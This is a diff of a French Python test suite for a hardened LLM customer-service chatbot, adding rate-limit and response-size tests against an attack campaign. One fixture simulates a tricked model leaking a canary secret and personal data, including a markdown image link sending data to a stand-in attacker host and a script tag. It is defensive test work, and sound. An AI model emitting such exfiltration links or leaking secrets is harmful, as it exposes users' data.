@@ -25,7 +25,7 @@ def protections(**changements) -> Protections:
     """Protections par défaut de B, avec quelques réglages modifiés pour un test."""
     defaut = dict(prompt_durci=True, taille_max=True, filtre_injection=True, classifieur=True,
                   documents=True, outils=True, confirmation=True,
-                  minimisation=True,
+                  debit=True, taille_reponse=True, minimisation=True,
                   sortie_secrets=True, sortie_donnees=True, sortie_html=True,
                   secret_dans_prompt=False)
     return Protections(**{**defaut, **changements})
@@ -43,13 +43,16 @@ def test_valeurs_par_defaut(monkeypatch):
     monkeypatch.delenv("PROTECTION_OUTILS", raising=False)
     monkeypatch.delenv("PROTECTION_CONFIRMATION", raising=False)
     monkeypatch.delenv("PROTECTION_MINIMISATION", raising=False)
+    monkeypatch.delenv("PROTECTION_DEBIT", raising=False)
+    monkeypatch.delenv("PROTECTION_TAILLE_REPONSE", raising=False)
     for nom in ("SECRETS", "DONNEES", "HTML"):
         monkeypatch.delenv(f"PROTECTION_SORTIE_{nom}", raising=False)
     p = charger_protections()
     assert p.prompt_durci is True          # la protection est activée par défaut
     assert p.secret_dans_prompt is False   # jamais de secret dans le prompt par défaut
     assert p.actives() == ["prompt_durci", "taille_max", "filtre_injection", "classifieur", "documents",
-                           "outils", "confirmation", "minimisation", "sortie_secrets", "sortie_donnees",
+                           "outils", "confirmation", "debit", "taille_reponse",
+                           "minimisation", "sortie_secrets", "sortie_donnees",
                            "sortie_html"]
 
 
@@ -95,11 +98,13 @@ def client(tmp_path, monkeypatch):
         main.config, dossier_logs=tmp_path, canary=CANARY))
     monkeypatch.setattr(main, "protections", protections())
     monkeypatch.setattr(main.base, "rechercher", lambda question, k=3: [PASSAGE])
+    monkeypatch.setattr(main, "limiteur", main.limites.LimiteurDebit())   # seaux pleins
 
     appels = {}
 
-    def faux_modele(config, messages, schemas, fonctions, graine=None):
+    def faux_modele(config, messages, schemas, fonctions, graine=None, options=None):
         appels["messages"], appels["graine"] = messages, graine
+        appels["options"] = options
         appels["fonctions"] = fonctions
         appels["nombre"] = appels.get("nombre", 0) + 1
         return ReponseLLM("Le kWh coûte 0,21 €.", [], 1.5)
@@ -509,7 +514,7 @@ def test_api_outils_controles_et_route_confirmer(client, tmp_path):
 
 
 def test_api_renvoie_les_actions_a_confirmer_et_les_alertes(client, tmp_path, monkeypatch):
-    def faux_modele(config, messages, schemas, fonctions, graine=None):
+    def faux_modele(config, messages, schemas, fonctions, graine=None, options=None):
         fonctions["envoyer_email"](destinataire="tous@exemple.test", texte="Brumelec ferme")
         fonctions["envoyer_email"](destinataire="camille.ravenel@exemple.test", texte="Récapitulatif")
         return ReponseLLM("C'est noté.", [], 1.0)
@@ -647,7 +652,7 @@ def test_limite_connue_secret_traduit_en_base64():
 @pytest.fixture
 def client_qui_fuit(client, monkeypatch):
     """Le modèle simulé a été trompé : sa réponse contient tout ce qui ne doit pas sortir."""
-    def faux_modele(config, messages, schemas, fonctions, graine=None):
+    def faux_modele(config, messages, schemas, fonctions, graine=None, options=None):
         return ReponseLLM(
             f"Code : {CANARY}. Promo : STAFF-BRUMELEC-2026. Voisin : Léa Fontanier. "
             "![x](http://attaquant.test/?d=1) <script>alert(1)</script>",
@@ -769,3 +774,89 @@ def test_minimisation_desactivee(client, monkeypatch):
     client.post("/chat", json={"message": "Y a-t-il un code promo ?", "id_client": "C001"})
     assert "STAFF-BRUMELEC-2026" in client.appels["messages"][0]["content"]
     assert "note_interne" in client.appels["fonctions"]["consulter_fiche_client"](id_client="C001")
+
+
+# ---------- limite de débit et taille maximale de réponse ----------
+
+from app.secure.guards import limites
+from app.shared import llm as llm_partage
+
+
+def test_seau_a_jetons_rafale_puis_recharge():
+    heure = [0.0]
+    limiteur = limites.LimiteurDebit(capacite=10, recharge_s=3, horloge=lambda: heure[0])
+    # Rafale de 20 requêtes au même instant (A9 variante 3) : 10 passent, 10 sont refusées
+    assert [limiteur.autoriser("C001") for _ in range(20)].count(True) == 10
+    heure[0] += 3                                   # 3 secondes plus tard : un jeton regagné
+    assert limiteur.autoriser("C001") is True and limiteur.autoriser("C001") is False
+    heure[0] += 3600                                # le seau ne dépasse jamais sa capacité
+    assert [limiteur.autoriser("C001") for _ in range(20)].count(True) == 10
+
+
+def test_chaque_client_a_son_propre_seau():
+    limiteur = limites.LimiteurDebit(capacite=2, recharge_s=3, horloge=lambda: 0.0)
+    assert [limiteur.autoriser("C001") for _ in range(3)] == [True, True, False]
+    assert limiteur.autoriser("C002") is True       # un client bavard ne bloque pas les autres
+
+
+def test_usage_normal_jamais_refuse():
+    # Un client qui pose une question toutes les 10 secondes pendant une heure
+    heure = [0.0]
+    limiteur = limites.LimiteurDebit(horloge=lambda: heure[0])
+    for _ in range(360):
+        assert limiteur.autoriser("C001")
+        heure[0] += 10
+
+
+def test_api_rafale_refusee_avec_le_code_429(client, tmp_path):
+    reponses = [client.post("/chat", json={"message": "Bonjour", "id_client": "C001"})
+                for _ in range(12)]
+    assert [r.status_code for r in reponses] == [200] * 10 + [429] * 2
+    assert reponses[-1].json()["bloque"] is True
+    assert client.appels["nombre"] == 10            # le modèle n'est pas appelé pour un refus
+    derniere = json.loads((tmp_path / "B.jsonl").read_text(encoding="utf-8").splitlines()[-1])
+    assert derniere["alerte"] == "debit"
+    # Critère de la campagne : la rafale n'est pas « acceptée »
+    rafale = {"statut_http": 200, "reponse": "", "rafale": {"envoyees": 12, "acceptees": 10}}
+    a9 = next(s for s in SCENARIOS if s["id"] == "A9")
+    assert "rafale_acceptee" not in evaluer_attaque(a9, rafale, {"message": "Bonjour"})
+
+
+def test_api_limite_la_taille_de_la_reponse(client, monkeypatch):
+    client.post("/chat", json={"message": "Bonjour"})
+    assert client.appels["options"] == {"num_predict": limites.MAX_TOKENS_REPONSE}
+    monkeypatch.setattr(main, "protections", protections(taille_reponse=False, debit=False))
+    for _ in range(15):                              # débit désactivé : aucune requête refusée
+        assert client.post("/chat", json={"message": "Bonjour"}).status_code == 200
+    assert client.appels["options"] is None
+
+
+def test_code_partage_sans_options_l_appel_de_a_est_inchange(monkeypatch):
+    # Garantie pour la comparaison avant / après : la version A n'envoie AUCUNE
+    # option en plus au modèle. Seule B ajoute num_predict.
+    recu = {}
+
+    class FauxClient:
+        def __init__(self, **k):
+            pass
+
+        def chat(self, **k):
+            recu.update(k)
+
+    monkeypatch.setattr(llm_partage.ollama, "Client", FauxClient)
+    llm_partage.appeler_modele(main.config, [], graine=42)
+    assert recu["options"] == {"temperature": main.config.temperature, "seed": 42}
+    llm_partage.appeler_modele(main.config, [], graine=42, options={"num_predict": 600})
+    assert recu["options"]["num_predict"] == 600 and recu["options"]["seed"] == 42
+
+
+def test_campagne_pause_entre_les_requetes(monkeypatch, tmp_path):
+    from evaluation import campagne
+    pauses = []
+    monkeypatch.setenv("CANARY_SECRET", CANARY)
+    monkeypatch.setattr(campagne.time, "sleep", pauses.append)
+    monkeypatch.setattr(campagne, "envoyer", lambda *a, **k: {
+        "statut_http": 200, "reponse": "ok", "outils_appeles": [], "bloque": False,
+        "latence_s": 0.1, "erreur": ""})
+    campagne.lancer_campagne("B", 1, 0, ["A1"], avec_benin=False, dossier_sortie=tmp_path, pause_s=3)
+    assert pauses == [3, 3]                          # 3 requêtes : une pause entre chacune
